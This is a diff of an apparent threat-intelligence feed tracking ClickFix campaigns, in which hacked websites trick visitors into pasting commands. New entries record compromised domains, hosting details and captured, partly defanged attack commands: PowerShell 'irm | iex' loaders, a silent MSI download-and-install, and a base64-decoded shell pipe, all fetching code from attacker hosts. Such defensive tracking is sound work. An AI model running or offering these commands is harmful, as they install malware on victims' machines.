@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5726,
+ "count": 5731,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -56257,7 +56257,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-24",
-   "last_seen": "2026-11-18",
+   "last_seen": "2026-11-19",
    "last_online": "2026-11-19",
    "offline_since": null,
    "url": "https://bv2000.com.pk/",
@@ -56275,7 +56275,7 @@
      "asn": "AS31898",
      "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
      "first_seen": "2026-10-24",
-     "last_seen": "2026-11-18"
+     "last_seen": "2026-11-19"
     }
    ],
    "hosts": [
@@ -56283,7 +56283,7 @@
      "host": "bv2000.com.pk",
      "status": "online",
      "first_seen": "2026-10-24",
-     "last_seen": "2026-11-18"
+     "last_seen": "2026-11-19"
     }
    ],
    "actor": null,
@@ -72087,6 +72087,58 @@
    "lure_from": []
   },
   {
+   "indicator": "colourdesignmasterpainters.co.nz",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-19",
+   "last_seen": "2026-11-19",
+   "last_online": "2026-11-19",
+   "offline_since": null,
+   "url": "https://www.colourdesignmasterpainters.co.nz/",
+   "brand": null,
+   "product": null,
+   "hosting": "GlobiCom Limited",
+   "dns": "hostadmin.co.nz",
+   "ip": "103.18.58.54",
+   "asn": "AS132692",
+   "org": "GLOBICOMLIMITED-AS-AP - GlobiCom Limited, NZ",
+   "country": "NZ",
+   "ips": [
+    {
+     "ip": "103.18.58.54",
+     "asn": "AS132692",
+     "org": "GLOBICOMLIMITED-AS-AP - GlobiCom Limited, NZ",
+     "first_seen": "2026-11-19",
+     "last_seen": "2026-11-19"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.colourdesignmasterpainters.co.nz",
+     "status": "online",
+     "first_seen": "2026-11-19",
+     "last_seen": "2026-11-19"
+    }
+   ],
+   "actor": "dprk",
+   "actor_link": "linked",
+   "commands": [
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
+    "curl -sL -d \"POSTDATA\" \"hxxps[:]//script[.]google[.][encoded]\""
+   ],
+   "connects_to": [
+    "fingerprint-veri.info"
+   ],
+   "lure_from": [
+    "softify.lat",
+    "browse-cloud.codes"
+   ]
+  },
+  {
    "indicator": "coltelligiapponesi.com",
    "type": "domain",
    "category": "clickfix",
@@ -72872,10 +72924,10 @@
     "fingerprint-veri.info"
    ],
    "lure_from": [
+    "browse-cloud.codes",
     "ncheck-brows.beer",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
+    "jjjducodes.beer"
    ]
   },
   {
@@ -97044,10 +97096,10 @@
     "fingerprint-veri.info"
    ],
    "lure_from": [
+    "browse-cloud.codes",
     "ncheck-brows.beer",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
+    "jjjducodes.beer"
    ]
   },
   {
@@ -112722,10 +112774,10 @@
     "ncheck-brows.beer"
    ],
    "lure_from": [
+    "browse-cloud.codes",
     "codes.caffe-img.com",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
+    "jjjducodes.beer"
    ]
   },
   {
@@ -122893,9 +122945,9 @@
    ],
    "lure_from": [
     "ncheck-brows.beer",
+    "browse-cloud.codes",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
+    "jjjducodes.beer"
    ]
   },
   {
@@ -145202,10 +145254,10 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-31",
-   "last_seen": "2026-11-18",
+   "last_seen": "2026-11-19",
    "last_online": "2026-11-19",
    "offline_since": null,
-   "url": "https://indiaseatradenews.com/",
+   "url": "https://indiaseatradenews.com/[redacted]/2026.10",
    "brand": null,
    "product": null,
    "hosting": "IN WHG Hosting Services Ltd",
@@ -145220,7 +145272,7 @@
      "asn": "AS199404",
      "org": "WHG-IN WHG Hosting Services Ltd, GB",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-11-18"
+     "last_seen": "2026-11-19"
     }
    ],
    "hosts": [
@@ -145228,7 +145280,7 @@
      "host": "indiaseatradenews.com",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-11-18"
+     "last_seen": "2026-11-19"
     }
    ],
    "actor": null,
@@ -163128,7 +163180,7 @@
    "last_seen": "2026-11-19",
    "last_online": "2026-11-19",
    "offline_since": null,
-   "url": "https://stg-hamiltonjankecomau-hamjankestg.kinsta.cloud/",
+   "url": "https://staging-everythingrhythmicgymnasticscom.kinsta.cloud/",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -213245,6 +213297,70 @@
    ]
   },
   {
+   "indicator": "personalgym.in",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-10-18",
+   "last_seen": "2026-11-05",
+   "last_online": "2026-11-19",
+   "offline_since": null,
+   "url": "https://personalgym.in/",
+   "brand": null,
+   "product": null,
+   "hosting": "Hostinger",
+   "dns": "dns-parking.com",
+   "ip": "2a02:4780:11:2305:0:21d7:603e:2",
+   "asn": "AS47583",
+   "org": "AS-HOSTINGER Hostinger International Limited, CY",
+   "country": "IN",
+   "ips": [
+    {
+     "ip": "2a02:4780:11:2305:0:21d7:603e:2",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-10-18",
+     "last_seen": "2026-11-05"
+    },
+    {
+     "ip": "92.249.46.6",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-10-18",
+     "last_seen": "2026-10-18"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "personalgym.in",
+     "status": "online",
+     "first_seen": "2026-10-18",
+     "last_seen": "2026-11-05"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'jscdncloude[.]beer/[id]'|iex;",
+    "irm 'cloud-browse[.]codes/[id]'|iex;",
+    "irm 'ncheck-brows[.]beer/[id]'|iex"
+   ],
+   "connects_to": [
+    "ncheck-brows.beer",
+    "jscdncloude.beer",
+    "cloud-browse.codes",
+    "id-verfied.boats",
+    "verifing-server.codes"
+   ],
+   "lure_from": [
+    "codes.caffe-img.com",
+    "browse-cloud.codes"
+   ]
+  },
+  {
    "indicator": "pescoonlinebill.se",
    "type": "domain",
    "category": "clickfix",
@@ -214541,6 +214657,56 @@
    ]
   },
   {
+   "indicator": "pillpusher.net",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-19",
+   "last_seen": "2026-11-19",
+   "last_online": "2026-11-19",
+   "offline_since": null,
+   "url": "https://pillpusher.net/",
+   "brand": null,
+   "product": null,
+   "hosting": "Oracle Cloud",
+   "dns": "Newfold",
+   "ip": "198.57.240.40",
+   "asn": "AS31898",
+   "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "198.57.240.40",
+     "asn": "AS31898",
+     "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
+     "first_seen": "2026-11-19",
+     "last_seen": "2026-11-19"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "pillpusher.net",
+     "status": "online",
+     "first_seen": "2026-11-19",
+     "last_seen": "2026-11-19"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"hxxps[:]//updatchk[.]com/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit"
+   ],
+   "connects_to": [
+    "updatchk.com"
+   ],
+   "lure_from": [
+    "browse-cloud.codes"
+   ]
+  },
+  {
    "indicator": "pinabessonfiglioli.net",
    "type": "domain",
    "category": "clickfix",
@@ -215079,15 +215245,14 @@
     "ncheck-brows.beer",
     "cloud-browse.codes",
     "jscdncloude.beer",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
+    "verifing-server.codes"
    ],
    "lure_from": [
     "id-verfied.boats",
     "codes.caffe-img.com",
+    "browse-cloud.codes",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
+    "jjjducodes.beer"
    ]
   },
   {
@@ -227298,14 +227463,13 @@
     "jscdncloude.beer",
     "cloud-browse.codes",
     "id-verfied.boats",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
+    "verifing-server.codes"
    ],
    "lure_from": [
     "codes.caffe-img.com",
+    "browse-cloud.codes",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
+    "jjjducodes.beer"
    ]
   },
   {
@@ -243491,6 +243655,58 @@
    ]
   },
   {
+   "indicator": "scoopsquadco.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-19",
+   "last_seen": "2026-11-19",
+   "last_online": "2026-11-19",
+   "offline_since": null,
+   "url": "https://www.scoopsquadco.com/",
+   "brand": "Meta",
+   "product": "Instagram",
+   "hosting": "New Dream Network",
+   "dns": "dreamhost.com",
+   "ip": "67.205.7.84",
+   "asn": "AS26347",
+   "org": "DREAMHOST-AS - New Dream Network, LLC, US",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "67.205.7.84",
+     "asn": "AS26347",
+     "org": "DREAMHOST-AS - New Dream Network, LLC, US",
+     "first_seen": "2026-11-19",
+     "last_seen": "2026-11-19"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.scoopsquadco.com",
+     "status": "online",
+     "first_seen": "2026-11-19",
+     "last_seen": "2026-11-19"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "echo '[encoded]' | base64 -d | zsh"
+   ],
+   "connects_to": [
+    "entitlementcheck.pro"
+   ],
+   "lure_from": [
+    "lovezramexar.info",
+    "makeverizyjar.info",
+    "browse-cloud.codes"
+   ]
+  },
+  {
    "indicator": "scorpionnewscorp.com",
    "type": "domain",
    "category": "clickfix",
@@ -247679,7 +247895,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-02",
-   "last_seen": "2026-11-03",
+   "last_seen": "2026-11-19",
    "last_online": "2026-11-19",
    "offline_since": null,
    "url": "https://shelbysbarberia.com/",
@@ -247697,7 +247913,7 @@
      "asn": "AS42612",
      "org": "DINAHOSTING-AS DinaHosting S.L., ES",
      "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
+     "last_seen": "2026-11-19"
     }
    ],
    "hosts": [
@@ -247705,7 +247921,7 @@
      "host": "shelbysbarberia.com",
      "status": "online",
      "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
+     "last_seen": "2026-11-19"
     }
    ],
    "actor": null,
@@ -276665,14 +276881,13 @@
     "cloud-browse.codes",
     "ncheck-brows.beer",
     "id-verfied.boats",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
+    "verifing-server.codes"
    ],
    "lure_from": [
     "codes.caffe-img.com",
+    "browse-cloud.codes",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
+    "jjjducodes.beer"
    ]
   },
   {
@@ -277265,8 +277480,7 @@
     "jscdncloude.beer",
     "cloud-browse.codes",
     "id-verfied.boats",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
+    "verifing-server.codes"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -277889,7 +278103,7 @@
    "last_seen": "2026-11-19",
    "last_online": "2026-11-19",
    "offline_since": null,
-   "url": "https://thetinytravelerblog.com/Lh",
+   "url": "https://thetinytravelerblog.com/wp-",
    "brand": null,
    "product": null,
    "hosting": "Oracle Cloud",
@@ -279361,14 +279575,13 @@
     "jscdncloude.beer",
     "cloud-browse.codes",
     "id-verfied.boats",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
+    "verifing-server.codes"
    ],
    "lure_from": [
     "codes.caffe-img.com",
+    "browse-cloud.codes",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
+    "jjjducodes.beer"
    ]
   },
   {
@@ -282785,14 +282998,13 @@
     "jscdncloude.beer",
     "cloud-browse.codes",
     "id-verfied.boats",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
+    "verifing-server.codes"
    ],
    "lure_from": [
     "codes.caffe-img.com",
+    "browse-cloud.codes",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
+    "jjjducodes.beer"
    ]
   },
   {
@@ -283763,7 +283975,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-01",
-   "last_seen": "2026-11-03",
+   "last_seen": "2026-11-19",
    "last_online": "2026-11-19",
    "offline_since": null,
    "url": "https://www.travaux-renovation-decoration.fr/",
@@ -283781,7 +283993,7 @@
      "asn": "AS53589",
      "org": "PLANETHOSTER-8 - PlanetHoster, CA",
      "first_seen": "2026-11-01",
-     "last_seen": "2026-11-03"
+     "last_seen": "2026-11-19"
     }
    ],
    "hosts": [
@@ -283789,7 +284001,7 @@
      "host": "www.travaux-renovation-decoration.fr",
      "status": "online",
      "first_seen": "2026-11-01",
-     "last_seen": "2026-11-03"
+     "last_seen": "2026-11-19"
     }
    ],
    "actor": null,
@@ -289359,7 +289571,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-21",
-   "last_seen": "2026-10-22",
+   "last_seen": "2026-11-19",
    "last_online": "2026-11-19",
    "offline_since": null,
    "url": "https://unitedpowerprojects.com/",
@@ -289369,7 +289581,7 @@
    "dns": "GoDaddy",
    "ip": "82.25.127.247",
    "asn": "AS47583",
-   "org": "AS-HOSTINGER Hostinger International Limited, CY",
+   "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
    "country": "IN",
    "ips": [
     {
@@ -289377,7 +289589,7 @@
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
+     "last_seen": "2026-11-19"
     }
    ],
    "hosts": [
@@ -289385,7 +289597,7 @@
      "host": "unitedpowerprojects.com",
      "status": "online",
      "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
+     "last_seen": "2026-11-19"
     }
    ],
    "actor": null,
@@ -292584,13 +292796,12 @@
    "connects_to": [
     "ncheck-brows.beer",
     "cloud-browse.codes",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
+    "verifing-server.codes"
    ],
    "lure_from": [
+    "browse-cloud.codes",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
+    "jjjducodes.beer"
    ]
   },
   {
@@ -301250,8 +301461,7 @@
     "cloud-browse.codes",
     "ncheck-brows.beer",
     "id-verfied.boats",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
+    "verifing-server.codes"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -302725,9 +302935,9 @@
     "groverudder12.com",
     "lepafonso.bz",
     "jscdncloude.beer",
+    "j7tracker.gb.net",
     "github.pw",
-    "t-trustresnew.com",
-    "trustchecknes.com"
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at",
@@ -311084,6 +311294,63 @@
     "s58v0h2v.fi1.site"
    ],
    "lure_from": []
+  },
+  {
+   "indicator": "z-creations.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-19",
+   "last_seen": "2026-11-19",
+   "last_online": "2026-11-19",
+   "offline_since": null,
+   "url": "https://z-creations.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Oracle Cloud",
+   "dns": "Newfold",
+   "ip": "50.6.156.147",
+   "asn": "AS31898",
+   "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "50.6.156.147",
+     "asn": "AS31898",
+     "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
+     "first_seen": "2026-11-19",
+     "last_seen": "2026-11-19"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "z-creations.com",
+     "status": "online",
+     "first_seen": "2026-11-19",
+     "last_seen": "2026-11-19"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex",
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
+   ],
+   "connects_to": [
+    "j7tracker.gb.net",
+    "lepafonso.bz",
+    "hagosuro.lc",
+    "xorados.com",
+    "trek-72.com",
+    "holodeo.net"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
   },
   {
    "indicator": "zabihahmarket.com",
